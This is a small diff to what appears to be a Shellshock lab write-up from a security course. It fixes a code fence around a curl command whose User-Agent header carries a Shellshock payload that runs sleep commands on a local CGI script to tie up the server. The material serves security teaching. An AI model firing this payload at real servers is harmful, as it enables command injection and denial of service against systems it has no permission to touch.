@@ -70,7 +70,7 @@ Crash the Server. In this task, we want to crash the server with the Shellshock 
 
 ```sh
 [10/20/21]seed@VM:.../cgi-bin$ curl -A '() { echo "hello";}; echo Content_type: text/plain; echo; /bin/sleep 20| /sbin/sleep 20|/usr/bin/sleep 20'  http://localhost/cgi-bin/myprog.cgi
-```sh
+```
 
 It attempts to run the sleep command in three different ways (since systems have slightly different configurations, sleep might be found in the directories /bin or /sbin or /usr/bin). Whichever sleep it runs, it causes the server to wait 20 seconds before replying . That will consume resources on the machine because a thread or process executing the sleep will do nothing else for 20 seconds.
 
